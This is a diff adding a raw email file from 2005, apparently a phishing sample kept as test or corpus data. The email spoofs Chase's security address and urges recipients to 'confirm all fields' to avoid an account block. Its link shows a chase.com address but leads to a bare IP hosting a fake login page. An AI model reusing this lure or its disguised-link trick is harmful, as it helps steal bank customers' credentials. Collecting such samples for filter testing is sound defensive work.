@@ -1,0 +1,110 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <mailtest@iMacWebServer.iMacWebServer>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+ by naughty.domain.com (Postfix) with ESMTP id 17E63536E33
+ for <username@login.domain.com>; Mon, 17 Oct 2005 11:46:00 -0400 (EDT)
+Received: from mail2.domain.com (localhost.domain.com [127.0.0.1])
+ by mail2.domain.com (Postfix) with ESMTP id 394B46FA1D1
+ for <username@domain.com>; Mon, 17 Oct 2005 11:45:55 -0400 (EDT)
+Received: from iMacWebServer (s142-179-211-68.ab.hsia.telus.net
+ [142.179.211.68]) by mail2.domain.com (Postfix) with ESMTP
+ for <username@domain.com>; Mon, 17 Oct 2005 11:45:55 -0400 (EDT)
+Received: by iMacWebServer (Postfix, from userid 1026)
+ id 1D0AFBA547; Mon, 17 Oct 2005 09:45:55 -0600 (MDT)
+To: username@domain.com
+Subject: Update and verify your Chase Manhatan account
+From: security@chase.com <security@chase.com>
+Content-Type: text/html
+Message-Id: <20051017154555.1D0AFBA547@iMacWebServer>
+Date: Mon, 17 Oct 2005 09:45:55 -0600 (MDT)
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: 
+X-Spam-Status: No, score=0.5 required=5.0 tests=HTML_40_50,HTML_MESSAGE,
+ HTML_TAG_EXIST_TBODY,MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,
+ NORMAL_HTTP_TO_IP autolearn=no version=3.0.2
+X-Spam-Report: * 0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address
+ in URL *  0.0 HTML_40_50 BODY: Message is 40% to 50% HTML
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+X-Keywords: 
+Status: O
+Content-Length: 3372
+Lines: 72
+
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>- NNSECU -</title>
+<meta name="generator" content="Namo WebEditor v5.0(Trial)">
+</head>
+
+<body>
+
+<!--VERSION value="4.3.0"-->
+<TABLE cellSpacing=0 cellPadding=0 width=774 border=0 xt="SPTABLE"
+name="SP_TABLE1" id="table1" height="320">
+<TBODY>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy" height="42"><img src="http://www.chase.com/cm/shared/cfs/image/logo/chase_logo.gif">
+</TD></TR>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy">
+
+<p align="left"> </p>
+<p align="left"><font face="Verdana" size="2">Dear CHASE Customers,</font></p>
+<p align="justify"><font face="Verdana" size="2">As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile. PLEASE REMEMBER YOU NEED TO CONFIRM ALL FIELDS OF THE FORM TO AVOID ACCOUNT BLOCK, and remember we do this for your safety!</font></p>
+
+
+<p align="justify"><font face="Verdana" size="2">To resubmit your information, please click 
+the link below:</font></p>
+<p align="justify">
+
+
+<font face="Verdana" size="2"><b><a target="_blank" href="http://67.18.208.132/~craig/images/logon/chaseonline/index.html ">http://www.chase.com/account-confirm23942942/confirmation.html  </a></b></font></p>
+<p align="justify"><font face="Verdana" size="2">If you received this notice and you are not the authorized account holder,
+please be aware that it is in violation of our policy to represent oneself
+as another CHASE user. Such action may also be in violation of local, national, 
+and/or international law. CHASE is committed to assist law enforcement with 
+any inquiries related to attempts to misappropriate personal information with
+the intent to commit fraud or theft. Information will be provided at the request
+of law enforcement agencies to ensure that perpetrators are prosecuted to the 
+fullest extent of the law.</font></p>
+
+<table align=right width="200" border="0">
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+<p align="justify"><font face="Verdana" size="2">Thanks for your patience as we work together to protect your account.</font></p>
+
+<p align="justify"><font face="Verdana" size="2">Special Regards,</font></p>
+<p align="justify"><font face="Verdana" size="2">CHASE Customer Support Center.</font></p>
+
+ 
+<div align="left"><font color="#bbb7c7" size="1" face="verdana,arial,helvetica"><span class="footer-text"><br>
+  <br>
+  This site is directed at or made available to persons in the United States and CHASE customers only. 
+   Products and services described, as well as associated fees, charges, 
+  interest rates, and balance requirements may differ among geographic locations. 
+  Not all products and services are offered at all locations.<br>
+  </span><br>
+</font></div>
+
+ 
+
+<div align="right"><font color="#bbb7c7" size="1" face="verdana,arial,helvetica">Copyright © 2005 - CHASE. Member FDIC. Equal Housing Lender. <img src="http://www.bankofthewest.com/BOW/assets/vcmStaticContent/images/icon_ehl.gif">
+</font></div>
+
+</TD></TR>
+</TBODY></TABLE>
+</body>
+
+</html>
